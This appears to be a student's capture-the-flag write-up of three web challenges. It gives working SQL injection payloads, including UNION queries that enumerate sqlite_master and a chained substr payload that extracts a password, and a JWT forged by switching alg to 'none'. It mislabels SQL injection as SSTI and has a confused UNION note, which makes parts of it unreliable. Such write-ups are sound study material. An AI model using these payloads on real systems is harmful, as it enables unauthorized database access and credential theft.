# 1. Database Incursion 2.0
> Get into the employee database to retrieve the flag.
## Solution:
- Enter Access Portal using SSTI (' OR '1'='1' --)
- Hint: I heard someone from Management has the passcode
- Enter ' OR Department = 'Management'-- payload to get management employees
- Hint: Talk to Kiwi, she has the passcode.
- Enter ' OR Name = 'Kiwi'-- payload to get employees named Kiwi
- Kiwi from Management not shown in the list from 10-13 so we look for Kiwi with ID=14 (' OR ID=14 --).
- Passcode: ecSKsN7SES
- Enter the passcode to get to the reports query. Metadat registry has a redacted table name.
- ' UNION SELECT 1, 2, tbl_name, 4 FROM sqlite_master -- payload to find the name of redacted table- CITADEL_ARCHIVE_2077.
- ' UNION SELECT 1, 2, sql, 4 FROM sqlite_master WHERE tbl_name='CITADEL_ARCHIVE_2077' -- payload to find out what kind of data the archive has. Text data named 'secrets' is stored.
- ' UNION SELECT secrets, NULL, NULL, NULL FROM CITADEL_ARCHIVE_2077 -- payload to get what is in the secrets table out of the 4 columns in the archive.
- Flag is displayed.
## Flag:
```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```
## Concepts Learnt:
- UNION is used for data exfiltration from the table to enumerate the database structure, then using those findings in a UNION query. 
- The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query.
## Resources:
- https://portswigger.net/web-security/sql-injection/union-attacks
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
***
# 2. Temporal Token
> I made my own website with custom auth, but why can't i login with my credentials?
```
Username: Belegar
Password: Ironhammer
```
## Solution:
- Token with original tokens- eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJCZWxlZ2FyIiwiZXhwIjowfQ.L4UuI63oMzkmh4clZMZPoANwNxnjiYTtZO90IBhQ8B8
- Decoding in jwt.io
- Header- {
  "alg": "HS256",
  "typ": "JWT"
  }
- Payload- {
  "sub": "Belegar",
  "exp": 0
  }
- Signature- invalid signature with a-string-secret-at-least-256-bits-long
- The expiration time right now is Jan 1, 1970. Changed it to some time in future- 1st dec,2025 23:30:44 GMT
- Unix epoch encoded exp value: 1764631844
- Since we don't know the signature which is HS256 scripted, we can change the alg value to "none"
- Signature is not needed now so signature can be left blank after the dot.
- New token- eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJCZWxlZ2FyIiwiZXhwIjoxNzY0NjMxODQ0fQ.
- Putting this token in the cookie value gives the flag.
## Flag:
```
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}
```
## Concepts Learnt:
- JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA or ECDSA.
- It's divided in 3 parts- [header].[payload].[signature]
## Resources:
- https://www.jwt.io/
- https://www.jwt.io/introduction#what-is-json-web-token
***
# 3. Oneshot
> Chance to enter only one payload to get the 32-bit password and retrieve the flag.
## Solution:
- Enter a new new session to get search id- 6c94e14494a4e17d
- Since only 1 character can be released at one payload, we make a concatenation of 32 similar payloads using UNION ALL SELECT
```
%' UNION ALL SELECT substr(password,1,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,2,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,3,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,4,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,5,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,6,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,7,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,8,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,9,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,10,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,11,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,12,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,13,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,14,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,15,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,16,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,17,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,18,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,19,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,20,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,21,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,22,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,23,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,24,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,25,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,26,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,27,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,28,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,29,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,30,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,31,1) FROM table_6c94e14494a4e17d UNION ALL SELECT substr(password,32,1) FROM table_6c94e14494a4e17d-- -
```
This released the 32 characters
```
9*******************************
9
e
f
6
5
a
4
2
a
8
8
e
6
8
1
f
5
a
e
1
8
f
c
f
d
7
c
f
0
6
9
c 
```
- The password for Guess becomes 9ef65a42a88e681f5ae18fcfd7cf069c
- Enter that to get the flag.
## Flag:
```
nite{are_you_feeling_the_heat_now :)}
```
## Concepts Learnt:
- The UNION ALL operator is used to combine the result-set of two or more SELECT statements.
- While the UNION operator removes duplicate values by default, the UNION ALL includes duplicate values.
## Notes:
- Upon using UNION, I got values like abc..012...
- This is because UNION doesn't show duplicate values.
- UNION SELECT doesn't have this problem.
## Resources:
- https://stackoverflow.com/questions/36878194/sql-order-by-substring-union
- https://www.sqlshack.com/sql-union-overview-usage-and-examples/
- https://www.w3schools.com/sql/sql_union_all.asp
***
